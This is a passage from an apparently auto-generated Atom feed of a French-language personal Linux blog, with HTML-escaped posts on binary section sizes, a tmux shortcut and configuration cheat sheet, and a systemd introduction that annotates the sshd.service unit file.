$ size a.out
text	   data	    bss	    dec	    hex	filename
1537	    548	      8	   2089	    829	a.out
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;La variable &lt;code class=&quot;highlighter-rouge&quot;&gt;var_global&lt;/code&gt; est maintenant initialisée, elle se retrouve donc dans la section &lt;code class=&quot;highlighter-rouge&quot;&gt;.data&lt;/code&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>tmux</title>
   <link href="http://localhost:4000/linux/2018/05/01/tmux/"/>
   <updated>2018-05-01T00:00:00+02:00</updated>
   <id>http://localhost:4000/linux/2018/05/01/tmux</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;sessions&quot;&gt;sessions&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# open or create session named 'basique'&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tmux new &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; basique 

&lt;span class=&quot;c&quot;&gt;# kill&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tmux kill-session &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; basique

&lt;span class=&quot;c&quot;&gt;# rename&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# list sessions&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tmux &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + s

&lt;span class=&quot;c&quot;&gt;# dettach&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + d
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tmux detach

&lt;span class=&quot;c&quot;&gt;# attach&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;tmux attach &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt; basique  

&lt;span class=&quot;c&quot;&gt;# jump&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# move to previous  &lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# move to next &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;windows&quot;&gt;windows&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# create&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + c

&lt;span class=&quot;c&quot;&gt;# rename&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + ,

&lt;span class=&quot;c&quot;&gt;# close&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &amp;amp;

&lt;span class=&quot;c&quot;&gt;# show tree&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + w  

&lt;span class=&quot;c&quot;&gt;# next&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + n  

&lt;span class=&quot;c&quot;&gt;# previous&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + p  

&lt;span class=&quot;c&quot;&gt;# switch&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + 0-9  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h1 id=&quot;iii---panes&quot;&gt;III - Panes&lt;/h1&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# go-back to previous pane&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# vertical split&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + %

&lt;span class=&quot;c&quot;&gt;# horizontal split&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# deplacement&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + fleche  

&lt;span class=&quot;c&quot;&gt;# zoom (toggle)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + z

&lt;span class=&quot;c&quot;&gt;# close&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + x

&lt;span class=&quot;c&quot;&gt;# scroll mode&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# resize&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ctrl + b + :
:resize-pane &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# down&lt;/span&gt;
:resize-pane &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# up&lt;/span&gt;
:resize-pane &lt;span class=&quot;nt&quot;&gt;-L&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# left&lt;/span&gt;
:resize-pane &lt;span class=&quot;nt&quot;&gt;-R&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# right&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;tmuxconf&quot;&gt;~/.tmux.conf&lt;/h2&gt;
&lt;hr /&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# set inactive/active window styles&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-style &lt;span class=&quot;s1&quot;&gt;'fg=colour247,bg=colour236'&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-active-style &lt;span class=&quot;s1&quot;&gt;'fg=colour250,bg=black'&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# loud or quiet?&lt;/span&gt;
set-option &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; visual-activity off
set-option &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; visual-bell off
set-option &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; visual-silence off
set-window-option &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; monitor-activity off
set-option &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; bell-action none

&lt;span class=&quot;c&quot;&gt;#  modes&lt;/span&gt;
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; clock-mode-colour colour5
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; mode-attr bold
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; mode-fg colour1
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; mode-bg colour18

&lt;span class=&quot;c&quot;&gt;# panes&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; pane-border-bg colour235
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; pane-border-fg colour238
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; pane-active-border-bg colour236
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; pane-active-border-fg colour51

&lt;span class=&quot;c&quot;&gt;# statusbar&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-position bottom
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-justify left
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-bg colour4
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-fg colour137
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-attr dim
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-left &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-right &lt;span class=&quot;s1&quot;&gt;'#[fg=colour137,bg=colour0,bold] %d/%m #[fg=colour137,bg=colour0,bold]| %H:%M '&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-right-length 50
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; status-left-length 20

setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-current-fg colour1
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-current-bg colour23
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-current-attr bold
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-current-format &lt;span class=&quot;s1&quot;&gt;' #I#[fg=colour137]:#[fg=colour255]#W#[fg=colour249]#F '&lt;/span&gt;

setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-fg colour9
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-bg colour8
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-attr none
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-format &lt;span class=&quot;s1&quot;&gt;' #I#[fg=colour237]:#[fg=colour250]#W#[fg=colour244]#F '&lt;/span&gt;

setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-bell-attr bold
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-bell-fg colour255
setw &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; window-status-bell-bg colour1

&lt;span class=&quot;c&quot;&gt;# messages&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; message-attr bold
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; message-fg colour232
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; message-bg colour16

&lt;span class=&quot;c&quot;&gt;# mouse support&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; mouse on

&lt;span class=&quot;c&quot;&gt;# don't rename windows automatically&lt;/span&gt;
set-option &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; allow-rename off
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</content>
 </entry>
 
 <entry>
   <title>systemd</title>
   <link href="http://localhost:4000/linux/2018/02/27/systemd/"/>
   <updated>2018-02-27T00:00:00+01:00</updated>
   <id>http://localhost:4000/linux/2018/02/27/systemd</id>
   <content type="html">&lt;!--more--&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;systemd&quot;&gt;systemd&lt;/h2&gt;
&lt;hr /&gt;

&lt;ul&gt;
  &lt;li&gt;system deamon&lt;/li&gt;
  &lt;li&gt;système d’initialisation&lt;/li&gt;
  &lt;li&gt;lance processus au démarrage&lt;/li&gt;
  &lt;li&gt;les gérer tout au long de leur exécution&lt;/li&gt;
  &lt;li&gt;conçu pour tourner avec le noyau Linux&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;systemd-processus&quot;&gt;systemd processus&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;premier processus lancé&lt;/li&gt;
  &lt;li&gt;dernier à s’arrêter&lt;/li&gt;
  &lt;li&gt;PID 1&lt;/li&gt;
  &lt;li&gt;PPID 0 (noyau)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;history&quot;&gt;history&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;successeur d’init System V, (&lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt;)&lt;/li&gt;
  &lt;li&gt;successeur  d’&lt;code class=&quot;highlighter-rouge&quot;&gt;upstart&lt;/code&gt; » (développé par Canonical (Ubuntu))&lt;/li&gt;
  &lt;li&gt;systemd est réputé pour être plus performant que ces derniers&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;working&quot;&gt;working&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;systemd manipule des &lt;code class=&quot;highlighter-rouge&quot;&gt;units&lt;/code&gt; qui sont de différents types:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;cibles ou &lt;code class=&quot;highlighter-rouge&quot;&gt;targets&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;services&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Les &lt;code class=&quot;highlighter-rouge&quot;&gt;units&lt;/code&gt; sont dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/systemd/system/*&lt;/code&gt; sous forme de fichiers.&lt;/p&gt;

&lt;p&gt;Dans &lt;code class=&quot;highlighter-rouge&quot;&gt;systemd&lt;/code&gt;, il n’y a plus réellement de notions de « &lt;code class=&quot;highlighter-rouge&quot;&gt;runlevels&lt;/code&gt; », ou niveaux d’exécutions, initialement présent dans &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; System V. Ces niveaux sont remplacés par des &lt;code class=&quot;highlighter-rouge&quot;&gt;tagets&lt;/code&gt;. On peut encore trouver des traces de &lt;code class=&quot;highlighter-rouge&quot;&gt;runlevels&lt;/code&gt;, mais sont souvent utilisés pour assurer une retro compatibilité avec « &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt; ». Systemd est complètement compatible avec &lt;code class=&quot;highlighter-rouge&quot;&gt;init&lt;/code&gt;, mais l’inverse n’est pas vrai.&lt;/p&gt;

&lt;p&gt;Voici les correspondances entre les &lt;code class=&quot;highlighter-rouge&quot;&gt;runlevels&lt;/code&gt; et les targets de &lt;code class=&quot;highlighter-rouge&quot;&gt;systemd&lt;/code&gt; :&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;init (runlevel)&lt;/th&gt;
      &lt;th style=&quot;text-align: left&quot;&gt;systemd&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;poweroff.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;rescue.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2/3/4&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;multi-user.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;5&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;graphical.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;6&lt;/code&gt;&lt;/td&gt;
      &lt;td style=&quot;text-align: left&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;reboot.target&lt;/code&gt;&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;Pour connaitre le runlevel d’une machine: &lt;code class=&quot;highlighter-rouge&quot;&gt;$ systemctl get-default&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;On remarquera que la cible « &lt;code class=&quot;highlighter-rouge&quot;&gt;default.target&lt;/code&gt; » qui se trouve dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/systemd/system/*&lt;/code&gt; est un lien symbolique qui pointe vers le « &lt;code class=&quot;highlighter-rouge&quot;&gt;.target&lt;/code&gt; » du runlevel actuel.&lt;/p&gt;

&lt;p&gt;Changer runlevel : &lt;code class=&quot;highlighter-rouge&quot;&gt;$ systemctl set-default multi-user.target&lt;/code&gt;. Ce qui aura pour effet de simplement modifier le lien symbolique de default.target.&lt;/p&gt;

&lt;p&gt;Appliquer la nouvelle cible à l’exécution courante: &lt;code class=&quot;highlighter-rouge&quot;&gt;$ systemctl isolate multi-user.target&lt;/code&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;service-exemple&quot;&gt;service exemple&lt;/h2&gt;
&lt;hr /&gt;

&lt;p&gt;Les &lt;code class=&quot;highlighter-rouge&quot;&gt;units&lt;/code&gt; dans &lt;code class=&quot;highlighter-rouge&quot;&gt;/lib/systemd/system/*&lt;/code&gt; respectent toutes la même mise en forme, et partagent de nombreuses directives définies par &lt;code class=&quot;highlighter-rouge&quot;&gt;systemd&lt;/code&gt;.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# /lib/systemd/system/sshd.service&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unit]
&lt;span class=&quot;nv&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;OpenBSD SecureShell server
&lt;span class=&quot;nv&quot;&gt;After&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;network.target auditd.service
&lt;span class=&quot;nv&quot;&gt;ConditionPathExists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=!&lt;/span&gt;/etc/ssh/sshd_not_to_be_run

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]
&lt;span class=&quot;nv&quot;&gt;EnvironmentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;-/etc/default/ssh
&lt;span class=&quot;nv&quot;&gt;ExecStartPre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SSHD_OPTS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ExecReload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ExecReload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/kill &lt;span class=&quot;nt&quot;&gt;-HUP&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$MAINPID&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;KillMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;process
&lt;span class=&quot;nv&quot;&gt;Restart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on-failure
&lt;span class=&quot;nv&quot;&gt;RestartPreventExistStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;255
&lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;notify

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Install]
&lt;span class=&quot;nv&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;multi-user.target
&lt;span class=&quot;nv&quot;&gt;Alias&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sshd.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;analyze&quot;&gt;analyze&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Unit]
&lt;span class=&quot;nv&quot;&gt;Description&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;OpenBSD SecureShell server
&lt;span class=&quot;nv&quot;&gt;After&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;network.target auditd.service
&lt;span class=&quot;nv&quot;&gt;ConditionPathExists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=!&lt;/span&gt;/etc/ssh/sshd_not_to_be_run
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Description&lt;/code&gt; : description du service&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;After&lt;/code&gt; : dépendances, sshd démarre si et seulement si &lt;code class=&quot;highlighter-rouge&quot;&gt;network.target&lt;/code&gt; (le réseau) et &lt;code class=&quot;highlighter-rouge&quot;&gt;auditd.service&lt;/code&gt; sont actifs. Si ce n’est pas le cas, systemd se charge de les activer avant l’activation de sshd.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ConditionPathExists&lt;/code&gt; : on s’assure aussi que le fichier &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/ssh/sshd_not_to_be_run&lt;/code&gt; n’existe pas&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Service]
&lt;span class=&quot;nv&quot;&gt;EnvironmentFile&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;-/etc/default/ssh
&lt;span class=&quot;nv&quot;&gt;ExecStartPre&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ExecStart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-D&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SSHD_OPTS&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ExecReload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/sbin/sshd &lt;span class=&quot;nt&quot;&gt;-t&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;ExecReload&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/bin/kill &lt;span class=&quot;nt&quot;&gt;-HUP&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$MAINPID&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;KillMode&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;process
&lt;span class=&quot;nv&quot;&gt;Restart&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;on-failure
&lt;span class=&quot;nv&quot;&gt;RestartPreventExistStatus&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;255
&lt;span class=&quot;nv&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;notify
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;EnvironmentFile&lt;/code&gt; : fichier avec variables à charger qui seront utilisées dans ce fichier&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ExecStartPre&lt;/code&gt; : commande pour démarrer le service&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ExecStart&lt;/code&gt; : commande pour démarrer le service&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ExecReload&lt;/code&gt; : commande pour recharger la configuration du service&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;KillMode&lt;/code&gt; : commande pour arrêter le service&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Install]
&lt;span class=&quot;nv&quot;&gt;WantedBy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;multi-user.target
&lt;span class=&quot;nv&quot;&gt;Alias&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;sshd.service
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;WantedBy&lt;/code&gt; : cible dans laquelle le service doit être démarrée&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Alias&lt;/code&gt; : un alias&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Remarque : pour les unités de type &lt;code class=&quot;highlighter-rouge&quot;&gt;target&lt;/code&gt; (cible), il existe un répertoire &lt;code class=&quot;highlighter-rouge&quot;&gt;.wants/&lt;/code&gt; qui contient les dépendances de la cible, qui sont des liens symboliques. Par exemple la cible &lt;code class=&quot;highlighter-rouge&quot;&gt;mutli-user.target&lt;/code&gt; possède un dossier &lt;code class=&quot;highlighter-rouge&quot;&gt;multi-user.target.wants/&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Remarque : l’activation d’un service ajoute un lien vers l’unité active vers le &lt;code class=&quot;highlighter-rouge&quot;&gt;.taget.want/&lt;/code&gt; actuel.&lt;/p&gt;

&lt;hr /&gt;
&lt;h2 id=&quot;commands&quot;&gt;commands&lt;/h2&gt;
&lt;hr /&gt;

